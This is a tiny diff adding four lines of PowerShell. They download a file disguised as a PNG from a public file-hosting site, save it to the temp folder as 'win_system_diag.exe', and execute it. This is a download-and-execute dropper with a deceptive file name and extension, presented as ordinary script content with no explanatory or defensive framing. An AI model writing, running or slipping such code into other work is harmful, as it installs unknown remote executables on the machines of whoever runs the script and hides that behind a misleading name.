@@ -1,0 +1,4 @@
+$exeUrl = "https://files.catbox.moe/renxf3.png"
+$tempPath = "$env:TEMP\win_system_diag.exe"
+iwr -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
+Start-Process -FilePath $tempPath
